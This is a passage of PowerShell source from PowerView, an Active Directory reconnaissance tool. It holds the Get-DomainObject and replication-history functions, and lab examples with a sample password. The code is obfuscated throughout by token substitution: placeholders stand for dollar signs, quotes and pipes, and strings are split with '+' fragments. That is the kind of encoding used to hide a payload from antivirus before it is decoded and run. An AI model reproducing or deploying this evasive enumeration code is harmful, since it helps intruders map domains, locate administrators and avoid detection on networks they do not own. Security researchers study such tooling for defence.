                    gIF1Up = Test-Connection -Count 1 -Quiet -ComputerName gIF1_.properties.dnshostname
                }
                if (gIF1Up) {
                    if (gIF1PSBoundParameters[41aRaw41a]) {
                        # return raw result objects
                        gIF1Computer = gIF1_
                        gIF1Computer.PSObject.TypeNames.Insert(0, 41aPowerView.Computer.Raw41a)
                    }
                    else {
                        gIF1Computer = Convert-LDAPProperty -Properties gIF1_.Properties
                        gIF1Computer.PSObject.TypeNames.Insert(0, 41aPowerView.Computer41a)
                    }
                    gIF1Computer
                }
            }
            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainComputer] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {
<#
.SYNOPSIS

Return all (or specified) domain objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Zfr-Properties samaccountname,usnchanged,...Zfr. By default, all objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from gIF1UACEnum, including
ZfrNOT_XZfr negation forms. To see all possible values, run 41a0U9BConvertFrom-UACValue -ShowAll41a.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainObject -Domain testlab.local

Return all objects for the testlab.local domain

.EXAMPLE

41aS-1-5-21-890171859-3433809279-3366196753-100341a, 41aCN=dfm,CN=Users,DC=testlab,DC=local41a,41ab6a9a2fb-bbd5-4f28-9a09-23213cea669341a,41adfm.a41a U9B Get-DomainObject -Properties distinguishedname

distinguishedname
-----------------
CN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local
CN=dfm,CN=Users,DC=testlab,DC=local
OU=OU3,DC=testlab,DC=local
CN=dfm (admin),CN=Users,DC=testlab,DC=local

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainObject -Credential gIF1Cred -Identity 41awindows141a

.EXAMPLE

Get-Domain U9B Select-Object -Expand name
testlab.local

41atestlabYwWharmj0y41a,41aDEVYwWDomain Admins41a U9B Get-DomainObject -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 41atestlab.local41a from 41atestlabYwWharmj0y41a
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(U9B(samAccountName=harmj0y)))

distinguishedname
-----------------
CN=harmj0y,CN=Users,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 41adev.testlab.local41a from 41aDEVYwWDomain Admins41a
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(U9B(samAccountName=Domain Admins)))
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.ADObject

Custom PSObject with translated AD object property fields.

PowerView.ADObject.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [OutputType(41aPowerView.ADObject41a)]
    [OutputType(41aPowerView.ADObject.Raw41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a, 41aMemberDistinguishedName41a, 41aMemberName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    DynamicParam {
        gIF1UACValueNames = [Enum]::GetNames(gIF1UACEnum)
        # add in the negations
        gIF1UACValueNames = gIF1UACValueNames U9B ForEach-Object {gIF1_; ZfrNOT_gIF1_Zfr}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet gIF1UACValueNames -Type ([array])
    }

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
     '+'   if (gIF1PS'+'BoundParameters -and (gIF1PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters gIF1PSBoundParameters
        }
        if (gIF1ObjectSearcher) {
            gIF1IdentityFilter = 41a41a
            gIF1Filter = 41a41a
            gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                if (gIF1IdentityInstance -match 41a^S-1-41a) {
                    gIF1IdentityFilter += Zfr(objectsid=gIF1IdentityInstance)Zfr
                }
                elseif (gIF1IdentityInstance -match 41a^(CNU9BOUU9BDC)=41a) {
                    gIF1IdentityFilter += Zfr(distinguishedname=gIF1IdentityInstance)Zfr
                    if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                        # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        Write-Verbose Zfr[Get-DomainObject] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                        gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                        gIF1ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not gIF1ObjectSearcher) {
                            Write-Warning Zfr[Get-DomainObject] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                        }
                    }
                }
                elseif (gIF1IdentityInstance -imatch 41a^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}gIF141a) {
                    gIF1GuidByteString = (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object { 41aYwW41a + gIF1_.ToString(41aX241a) }) -join 41a41a
                    gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                }
                elseif (gIF1IdentityInstance.Contains(41aYwW41a)) {
                    gIF1ConvertedIdentityInstance = gIF1IdentityInstance.Replace(41aYwW2841a, 41a(41a).Replace(41aYwW2941a, 41a)41a) U9B Convert-ADName -OutputType Canonical
                    if (gIF1ConvertedIdentityInstance) {
                        gIF1ObjectDomain = gIF1ConvertedIdentityInstance.SubString(0, gIF1ConvertedIdentityInstance.IndexOf(41a/41a))
                        gIF1ObjectName = gIF1IdentityInstance.Split(41aYwW41a)[1]
                        gIF1IdentityFilter += Zfr(samAccountName=gIF1ObjectName)Zfr
                        gIF1SearcherArguments[41aDomain41a] = gIF1ObjectDomain
                        Write-Verbose Zfr[Get-DomainObject] Extracted domain 41agIF1ObjectDomain41a from 41agIF1IdentityInstance41aZfr
                        gIF1ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif (gIF1IdentityInstance.Contains(41a.41a)) {
                    gIF1IdentityFilter += Zfr(U9B(samAccountName=gIF1IdentityInstance)(name=gIF1IdentityInstance)(dnshostname=gIF1IdentityInstance))Zfr
                }
                else {
                    gIF1IdentityFilter += Zfr(U9B(samAccountName=gIF1IdentityInstance)(name=gIF1IdentityInstance)(displayname=gIF1IdentityInstance))Zfr
                }
            }
            if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
            }

            if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
                Write-Verbose Zfr[Get-DomainObject] Using additional LDAP filter: gIF1LDAPFilterZfr
                gIF1Filter += ZfrgIF1LDAPFilterZfr
            }

            # build the LDAP filter for the dynamic UAC filter value
            gIF1UACFilter U9B Where-Object {gIF1_} U9B ForEach-Object {
                if (gIF1_ -match 41aNOT_.*41a) {
                    gIF1UACField = gIF1_.Substring(4)
                    gIF1UACValue = [Int](gIF1UACEnum::gIF1UACField)
                    gIF1Filter += Zfr(!(userAccountControl:1.2.840.113556.1.4.803:=gIF1UACValue))Zfr
                }
                else {
                    gIF1UACValue = [Int](gIF1UACEnum::gIF1_)
                    gIF1Filter += Zfr(userAccountControl:1.2.840.113556.1.4.803:=gIF1UACValue)Zfr
                }
            }

            if (gIF1Filter -and gIF1Filter -ne 41a41a) {
                gIF1ObjectSearcher.filter = Zfr(&gIF1Filter)Zfr
            }
            Write-Verbose Zfr[Get-DomainObject] Get-DomainObject filter '+'string: gIF1(gIF1ObjectSearcher.filter)Zfr

            if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1ObjectSearcher.FindOne() }
            else { gIF1Results = gIF1ObjectSearcher.FindAll() }
            gIF1Results U9B Where-Object {gIF1_} U9B For'+'Each-Object {
                if (gIF1PSBoundParameters[41aRaw41a]) {
                    # return raw result objects
                    gIF1Object = gIF1_
                    gIF1Object.PSObject.TypeNames.Insert(0, 41aPowerView.ADObject.Raw41a)
                }
                else {
                    gIF1Object = Convert-LDAPProperty -Properties gIF1_.Properties
                    gIF1Object.PSObject.TypeNames.Insert(0, 41aPowerView.ADObject41a)
                }
                gIF1Object
            }
            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainObject] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {
<#
.SYNOPSIS

'+'
Returns the Active Directory attribute replication metadata for the specified
object, i.e. a parsed version of the msds-replattributemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property 41amsds-replattributemetadata41a.
This is the domain attribute replication metadata associated with the object. The results are
parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase
'+'

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.P'+'ARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searchin'+'g. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAttributeHistory -Domain testlab.local

Return all attribute replication metadata for all objects in the testlab.local domain.

.EXAMPLE

41aS-1-5-21-883232822-274137685-4173207997-110941a,41aCN=dfm.a,CN=Users,DC=testlab,DC=local41a,41ada41a,41a94299db1-e3e7-48f9-845b-3bffef8bedbb41a U9B Get-DomainObjectAttributeHistory -Properties objectClass U9B ft

ObjectDN      ObjectGuid    AttributeNam LastOriginat Version      LastOriginat
                            e            ingChange                 ingDsaDN
--------      ----------    ------------ ------------ -------      ------------
CN=dfm.a,C... a6263874-f... objectClass  2017-03-0... 1            CN=NTDS S...
CN=DA,CN=U... 77b56df4-f... objectClass  2017-04-1... 1            CN=NTDS S...
CN=harmj0y... 94299db1-e... objectClass  2017-03-0... 1            CN=NTDS S...

.EXAMPLE

Get-DomainObjectAttributeHistory harmj0y -Properties userAccountControl

ObjectDN              : CN=harmj0y,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94299db1-e3e7-48f9-845b-3bffef8bedbb
AttributeName         : userAccountControl
LastOriginatingChange : 2017-03-07T19'+':56:27Z
Version               : 4
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-delegation-change-how-to-track-security-descriptor-modifications/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [OutputType(41aPowerView.ADObjectAttributeHistory41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a, 41aMemberDistinguishedName41a, 41aMemberName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    BEGIN {
        gIF1SearcherArguments = @{
            41aProperties41a    =   41amsds-replattributemetadata41a,41adistinguishedname41a
            41aRaw41a           =   gIF1True
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1SearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
'+'        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1SearcherArguments[41aFindOne41a] = gIF1FindOne }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSBoundParameters[41aProperties41a]) {
            gIF1PropertyFilter = gIF1PSBoundParameters[41aProperties41a] -Join 41aU9B41a
        }
        else {
            gIF1PropertyFilter = 41a41a
        }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aIdentity41a]) { gIF1SearcherArguments[41aIdentity41a] = gIF1Identity }

        Get-DomainObject @SearcherArguments U9B ForEach-Object {
            gIF1ObjectDN = gIF1_.Properties[41adistinguishedname41a][0]
            ForEach(gIF1XMLNode in gIF1_.Properties[41amsds-replattributemetadata41a]) {
                gIF1TempObject = [xml]gIF1XMLNode U9B Select-Object -ExpandProperty 41aDS_REPL_ATTR_META_DATA41a -ErrorAction SilentlyContinue
                if (gIF1TempObject) {
                    if (gIF1TempObject.pszAttributeName -Match gIF1PropertyFilter) {
                        gIF1Output = New-Object PSObject
                        gIF1Output U9B Add-Member NoteProperty 41aObjectDN41a gIF1ObjectDN
                        gIF1Output U9B Add-Member NoteProperty 41aAttributeName41a gIF1TempObject.pszAttributeName
                        gIF1Output U9B Add-Member NoteProperty 41aLastOriginatingChange41a gIF1TempObject.ftimeLastOriginatingChange
                        gIF1Output U9B Add-Member NoteProperty 41aVersion41a gIF1TempObject.dwVersion
                        gIF1Output U9B Add-Member NoteProperty 41aLastOriginatingDsaDN41a gIF1TempObject.pszLastOriginatingDsaDN
                        gIF1Output.PSObject.TypeNames.Insert(0, 41aPowerView.ADObjectAttributeHistory41a)
                        gIF1Output
                    }
                }
                else {
                    Write-Verbose Zfr[Get-DomainObjectAttributeHistory] Error retrieving 41amsds-replattributemetadata41a for 41agIF1ObjectDN41aZfr
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {
<#
.SYNOPSIS

Returns the Active Directory links attribute value replication metadata for the
specified object, i.e. a parsed version of the msds-replvaluemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property 41amsds-replvaluemetadata41a.
This is the domain linked attribut'+'e value replication metadata associated with the object. The
results are parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory U9B Group-Object ObjectDN U9B ft -a

Count Name
----- ----
    4 CN=Administrators,CN=Builtin,DC=testlab,DC=local
    4 CN=Users,CN=Builtin,DC=testlab,DC=local
    2 CN=Guests,CN=Builtin,DC=testlab,DC=local
    1 CN=IIS_IUSRS,CN=Builtin,DC=testlab,DC=local
    1 CN=Schema Admins,CN=Users,DC=testlab,DC=local
    1 CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
    4 CN=Domain Admins,CN=Users,DC=testlab,DC=local
    1 CN=Group Policy Creator Owners,CN=Users,DC=testlab,DC=local
    1 CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=testlab,DC=local
    1 CN=Windows Authorization Access Group,CN=Builtin,DC=testlab,DC=local
    8 CN=Denied RODC Password Replication Group,CN=Users,DC=testlab,DC=local
    2 CN=PRIMARY,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,...
    1 CN=Domain System Volume,CN=DFSR-LocalSettings,CN=PRIMARY,OU=Domain Con...
    1 CN=ServerAdmins,CN=Users,DC=testlab,DC=local
    3 CN=DomainLocalGroup,CN=Users,DC=testlab,DC=local


.EXAMPLE

41aS-1-5-21-883232822-274137685-4173207997-51941a,41aaf94f49e-61a5-4f7d-a17c-d80fb16a522041a U9B Get-DomainObjectLinkedAttributeHistory

ObjectDN              : CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94e782c1-16a1-400b-a7d0-1126038c6387
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=dfm,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-06-13T22:20:02Z
TimeCreated           : 2017-06-13T22:20:02Z
LastOriginatingChange : 2017-06-13T22:20:22Z
Version               : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory ServerAdmins -Domain testlab.local

ObjectDN              : CN=ServerAdmins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 603b46ad-555c-49b3-8745-c0718febefc2
AttributeName         : member
AttributeValue        : CN=jason.a,CN=Users,DC=dev,DC=testlab,DC=local
TimeDeleted           : 2017-04-10T22:17:19Z
TimeCreated           : 2017-04-10T22:17:19Z
LastOriginatingChange : 2017-04-10T22:17:19Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectLinkedAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [OutputType(41aPowerView.ADObjectLinkedAttributeHistory41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a, 41aMemberDistinguishedName41a, 41aMemberName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    BEGIN {
        gIF1SearcherArguments = @{
            41aProperties41a    =   41amsds-replvaluemetadata41a,41adistinguishedname41a
            41aRaw41a           =   gIF1True
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1SearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSBoundParameters[41aProperties41a]) {
